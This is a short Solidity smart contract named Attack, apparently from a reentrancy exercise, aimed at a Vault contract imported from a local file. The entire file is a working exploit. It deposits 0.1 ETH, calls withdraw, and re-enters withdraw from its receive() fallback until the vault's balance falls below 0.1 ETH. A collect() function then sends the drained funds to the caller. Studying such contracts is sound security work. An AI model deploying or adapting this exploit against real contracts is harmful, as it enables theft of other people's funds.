// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";

contract Attack {
    Vault public vault;

    constructor(Vault _vault) {
        vault = _vault;
    }

    // recive ETH
    receive() external payable {
        if (address(vault).balance >= 0.1 ether) {
            vault.withdraw(); // repeat
        }
    }

    // attack
    function attack() external payable {
        require(msg.value >= 0.1 ether, "Need at least 0.1 ETH to attack");
        vault.deposite{value: 0.1 ether}();
        vault.withdraw();
    }

    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
